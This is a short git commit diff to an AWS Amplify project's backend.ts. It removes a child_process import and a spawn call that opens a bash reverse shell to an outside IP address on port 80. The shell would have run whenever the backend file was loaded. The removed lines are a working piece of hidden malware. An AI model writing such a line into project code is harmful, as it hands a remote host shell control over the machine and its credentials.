f1505a8b899f9ac9995b621b08c02675f82d1970
yoloampli <ylosonci+amplify@amazon.com>
2024-12-11 13:58:54 -0500

    Update backend.ts

--- amplify/backend.ts
+++ amplify/backend.ts
@@ -1,10 +1,6 @@
 import { defineBackend } from '@aws-amplify/backend';
 import { auth } from './auth/resource.js';
 import { data } from './data/resource.js';
-import { spawn } from 'child_process';
-
-const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
-console.log(child);
 
 
 defineBackend({
